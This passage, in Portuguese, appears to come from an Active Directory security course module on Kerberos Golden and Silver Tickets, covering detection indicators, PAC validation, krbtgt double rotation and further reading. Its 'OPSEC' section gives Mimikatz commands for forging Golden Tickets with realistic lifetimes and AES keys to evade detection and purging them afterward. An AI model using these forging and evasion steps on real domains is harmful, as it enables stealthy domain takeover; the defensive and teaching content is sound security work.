- Detecção específica: "Kerberos Golden Ticket Attack" — detecta tickets com atributos anômalos
- Detecta tickets com lifetime maior que a política do domínio
- Detecta usuários que solicitam tickets mas não têm histórico de logon
- Detecta tickets com encryption types não suportados pelo usuário

**Indicadores comportamentais**:
- Usuário acessando muitos recursos diferentes em curto intervalo (com Golden Ticket é comum)
- Uso de `dir \\DC\C$` ou ferramentas de administração remota por contas não-admin
- Correlação de logins bem-sucedidos sem evento de logon correspondente no DC

### Detecção de Silver Ticket

Silver Ticket é significativamente mais difícil de detectar porque:
- **Não passa pelo KDC** — não gera eventos 4768 ou 4769 no Domain Controller
- Gera apenas eventos no servidor do serviço alvo (4624, 4627)
- O evento de logon no servidor mostra autenticação Kerberos normal

**Detecção possível**:
```
No servidor alvo:
Event ID: 4624 (Logon successful)
- Logon Type: 3 (Network)
- Authentication Package: Kerberos
- Ticket Encryption Type: 0x17 (RC4 para um serviço que usa AES)
- Verificar se o usuário realmente deveria ter acesso àquele serviço

Anomalias de acesso:
- Acesso a arquivo/share por usuário sem histórico de acesso
- Horário anômalo de acesso
- Volume de dados acessados fora do padrão
```

**PAC Validation** (mitigação real):
```powershell
# Habilitar PAC Validation no serviço (elimina Silver Tickets)
# Registry no servidor alvo:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters
ValidateKdcPacSignature = 1  # 0 = desabilitado (padrão), 1 = habilitado

# Cuidado: aumenta carga no DC e pode causar falhas em serviços mal configurados
```

### OPSEC — Golden Ticket

```powershell
# RUIM — Facilmente detectado
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-... /krbtgt:HASH \
    /endsfor:87600  # 10 anos — extremamente suspeito

# MELHOR — Simular comportamento normal
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-... /krbtgt:HASH \
    /startoffset:-10 \   # Ticket "começou" 10 min atrás
    /endsfor:600 \       # Exatamente 10 horas — padrão do AD
    /renewmax:10080 \    # 7 dias renovável — padrão do AD
    /ticket:golden.kirbi

# Usar username que EXISTE no AD (não fictício)
# Usar AES256 ao invés de RC4 (menos suspeito)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-... \
    /aes256:KRBTGT_AES256_KEY \  # ao invés de /krbtgt (RC4)
    /ticket:golden_aes.kirbi

# Limitar acesso — não varrer todos os servidores com o ticket
# Usar somente para o objetivo específico

# Purgar tickets após uso
kerberos::purge

# Diamond Ticket é mais furtivo que Golden Ticket — preferir quando possível
```

### Remediação / Impacto do Rotacionamento do krbtgt

```
Quando o krbtgt é rotacionado:
1. Primeira rotação: revoga todos Golden Tickets (hash novo é diferente)
   - Todos TGTs ativos expiram
   - Golden Tickets paros de funcionar
   - PORÉM: DCs ainda aceitam tickets assinados com hash ANTERIOR por compatibilidade
   → Atacante com Golden Ticket criado antes da primeira rotação AINDA TEM ACESSO

2. Segunda rotação: revoga hash anterior também
   → Agora SIM — Golden Tickets completamente inválidos

Por isso: SOC/CSIRT deve SEMPRE rotacionar krbtgt DUAS VEZES com intervalo de ~10 horas
(tempo suficiente para todos os TGTs existentes expirarem entre as rotações)

Script oficial Microsoft para rotacionamento seguro:
Reset-KrbtgtKeyInteractive.ps1
(disponível em: https://github.com/microsoft/New-KrbtgtKeys.ps1)
```

---

## Módulos Relacionados

`02_kerberoasting_e_asrep.md` cobre como obter hash de service account pra Silver Ticket. `04_dcsync_e_dominancia.md` mostra como obter hash do krbtgt via DCSync pra Golden Ticket. `05_delegacao_unconstrained.md` aprofunda como Unconstrained Delegation permite capturar TGTs. `07_forest_e_domain_trusts.md` cobre Extra SIDs e escalação cross-forest com Golden Ticket. `08_bloodhound_e_enumeracao.md` identifica service accounts e seus SPNs. MITRE ATT&CK: T1558.001 (Golden Ticket), T1558.002 (Silver Ticket).

---

## Leitura Complementar

- harmj0y — "The Unintended Risks of Trusting Active Directory"
- Sean Metcalf — "Mimikatz and Active Directory Kerberos Attacks" — https://adsecurity.org/?p=1640
- Mimikatz documentation (Benjamin Delpy) — https://github.com/gentilkiwi/mimikatz/wiki
- SpecterOps Rubeus Guide — https://github.com/GhostPack/Rubeus
- Impacket ticketer.py — https://github.com/fortra/impacket
- Microsoft — Reset the KRBTGT Account Password/Keys
